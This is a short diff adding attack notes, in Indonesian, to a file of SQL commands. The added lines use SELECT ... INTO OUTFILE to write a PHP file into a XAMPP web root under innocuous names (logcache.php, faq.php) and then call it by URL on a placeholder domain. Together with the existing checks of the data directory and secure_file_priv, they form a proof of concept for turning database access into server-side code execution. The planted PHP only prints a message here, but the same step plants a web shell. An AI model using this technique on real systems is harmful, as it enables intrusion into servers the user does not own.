@@ -9,6 +9,20 @@ SELECT @@datadir;
 
 SHOW VARIABLES LIKE 'secure_file_priv';
 
+pembuktian dulu
+SELECT '<?php echo "erorr 4055"; ?>' 
+
+INTO OUTFILE 'D:/xampp/htdocs/Web_Sci/public/logcache.php';
+panggil
+https://www.dummy.co.id/logcache.php
+
+
+pembuktian 2
+SELECT '<?php echo "erorr 4055"; ?>' 
+
+INTO OUTFILE 'D:/xampp/htdocs/dashboard/faq.php';
+panggil
+https://www.dummy.co.id/dashboard/faq.php
 
 
 
